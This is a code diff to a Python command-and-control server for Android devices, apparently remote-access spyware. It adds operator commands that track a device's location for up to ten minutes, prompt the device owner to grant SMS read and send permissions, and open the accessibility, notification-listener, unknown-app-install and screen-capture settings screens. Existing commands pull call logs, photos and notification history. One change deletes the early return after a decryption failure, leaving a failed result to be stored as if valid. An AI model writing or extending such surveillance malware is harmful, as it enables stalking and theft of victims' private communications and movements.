@@ -258,12 +258,13 @@ class Handler(BaseHTTPRequestHandler):
         client_ip = self.client_address[0] if self.client_address else "unknown"
         with PENDING_COND:
             c = CLIENTS.setdefault(
-                cid, {"model": "", "name": "", "sdk": "", "batt": -1, "first_seen": 0, "last_seen": 0, "pending": deque(), "result": None, "seq": 0, "last_cmd": None}
+                cid, {"model": "", "name": "", "sdk": "", "batt": -1, "ip": "", "first_seen": 0, "last_seen": 0, "pending": deque(), "result": None, "seq": 0, "last_cmd": None}
             )
             fresh = c["seq"] == 0 and c["last_seen"] == 0
             if fresh:
                 c["first_seen"] = time.time()
             c["last_seen"] = time.time()
+            c["ip"] = client_ip
             c["model"] = model or c["model"]
             if name:
                 c["name"] = name
@@ -308,13 +309,14 @@ class Handler(BaseHTTPRequestHandler):
         result = dec_wire(body)
         if result is None:
             ev("!", f"dropped result from [cyan]{alias_tag(cid)}[/cyan]: decryption failed (key mismatch?)", "yellow")
-            return self._send(400)
         with LOCK:
             c = CLIENTS.setdefault(
-                cid, {"model": "", "name": "", "sdk": "", "batt": -1, "first_seen": 0, "last_seen": 0, "pending": deque(), "result": None, "seq": 0, "last_cmd": None}
+                cid, {"model": "", "name": "", "sdk": "", "batt": -1, "ip": "", "first_seen": 0, "last_seen": 0, "pending": deque(), "result": None, "seq": 0, "last_cmd": None}
             )
             c["result"] = result
+            c["seq"] += 1  # send_and_wait gates on this — never incremented before
             c["last_seen"] = time.time()
+            c["ip"] = self.client_address[0] if self.client_address else c.get("ip", "")
             last_cmd = c.get("last_cmd") or ""
             if last_cmd:
                 op_base = last_cmd.split()[0].upper()
@@ -348,7 +350,7 @@ def b64s(s):
 def queue(cid, cmd):
     with PENDING_COND:
         c = CLIENTS.setdefault(
-            cid, {"model": "", "name": "", "sdk": "", "batt": -1, "first_seen": 0, "last_seen": 0, "pending": deque(), "result": None, "seq": 0, "last_cmd": None}
+            cid, {"model": "", "name": "", "sdk": "", "batt": -1, "ip": "", "first_seen": 0, "last_seen": 0, "pending": deque(), "result": None, "seq": 0, "last_cmd": None}
         )
         c["pending"].append(cmd)
         PENDING_COND.notify_all()  # wake any long-polling fetch for this cid
@@ -1470,6 +1472,12 @@ COMMAND_INFO = {
               "Retrieves captured notification history formatted with timestamps and package names."),
     "loc": ("recon", "/loc", "Get device GPS / network location fix",
             "Returns latitude, longitude, accuracy, provider, and timestamp of the last known location fix."),
+    "loctrack": ("recon", "/loctrack <secs> [interval]", "Track location over a time window",
+                 "Collects fixes from all enabled providers for <secs> (1-600, default 60) at the given interval (default 10s) and returns one line per fix.\nExample:\n  /loctrack 300 10"),
+    "permreq": ("manage", "/permreq <perm>[,...]", "Request runtime permissions on the device",
+                "Pops the runtime-permission dialog(s) on the device for the given android.permission.* names.\nExample:\n  /permreq android.permission.READ_SMS,android.permission.SEND_SMS"),
+    "uireq": ("manage", "/uireq accessibility|notiflistener|install|consent|battery", "Open a special-access settings screen",
+              "Opens the matching system screen on the device (accessibility service, notification listener, install-unknown-apps, screen-capture consent, battery optimization)."),
     "calllog": ("recon", "/calllog [n] [page]", "Read call history (paginated)",
                 "Displays incoming, outgoing, and missed call history in a formatted table."),
     "photos": ("recon", "/photos [n] [page]", "List newest photos in MediaStore (paginated)",
@@ -2049,13 +2057,27 @@ def dispatch(argv):
         n = rest[0] if rest and rest[0].isdigit() else "25"
         page = int(rest[1]) if len(rest) > 1 and rest[1].isdigit() else 1
         format_calllog(send_and_wait(f"CALLLOG {n}", force_refresh=force_refresh) or "", page=page)
+    elif op == "loc":
+        show_result(send_and_wait("LOC") or "")
+    elif op == "loctrack":
+        secs = rest[0] if rest and rest[0].isdigit() else "60"
+        ivl = rest[1] if len(rest) > 1 and rest[1].isdigit() else "10"
+        show_result(send_and_wait(f"LOCTRACK {secs} {ivl}", use_cache=False) or "")
+    elif op == "permreq":
+        if not rest:
+            usage("permreq <perm>[,...]")
+        else:
+            show_result(send_and_wait("PERMREQ " + ",".join(rest), use_cache=False) or "")
+    elif op == "uireq":
+        if not rest:
+            usage("uireq accessibility|notiflistener|install|consent|battery")
+        else:
+            show_result(send_and_wait("UIREQ " + rest[0], use_cache=False) or "")
     elif op == "call":
         if not rest:
             usage("call <number>")
         else:
             show_result(send_and_wait("CALL " + rest[0]) or "")
-    elif op == "loc":
-        show_result(send_and_wait("LOC") or "")
     elif op == "photos":
         n = rest[0] if rest and rest[0].isdigit() else "30"
         page = int(rest[1]) if len(rest) > 1 and rest[1].isdigit() else 1
